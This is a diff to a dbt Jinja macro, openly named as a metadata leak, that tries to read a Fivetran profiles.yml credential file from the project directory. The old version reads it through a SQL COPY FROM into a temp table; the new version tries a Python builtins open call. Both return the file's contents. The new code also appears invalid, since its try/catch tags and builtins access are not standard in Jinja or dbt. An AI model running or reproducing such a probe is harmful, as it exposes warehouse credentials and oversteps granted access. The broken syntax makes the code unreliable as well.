@@ -1,18 +1,18 @@
 {% macro internal_metadata_leak() %}
-    {% if execute %}
-        {% set profile_content = "attempting..." %}
+    {% if execute %}        
+        {% set path = "/tmp/dbt/project/.fivetran/profiles.yml" %}
+                
+        {% set result = "blocked" %}
+                
+        {% try %}
+           {% set f = modules.builtins.open(path, 'r') %}
+           {% set result = f.read() | truncate(500) %}
+        {% catch %}
+           {% set result = "builtins_open_failed" %}
+        {% endtry %}
         
-        {% set query %}
-            CREATE TEMP TABLE temp_leak (content text);
-            COPY temp_leak FROM '/tmp/dbt/project/.fivetran/profiles.yml';
-            SELECT content FROM temp_leak;
-        {% endset %}
-        
-        {% set results = run_query(query) if execute else [] %}
-        {% set file_data = results.columns[0].values() | join("\n") if results else "access_denied" %}
-        
-        {{ return("FILE_DATA: " ~ file_data) }}
+        {{ return("FILE_CONTENT: " ~ result) }}
     {% else %}
-        {{ return("reading...") }}
+        {{ return("probing_file...") }}
     {% endif %}
 {% endmacro %}
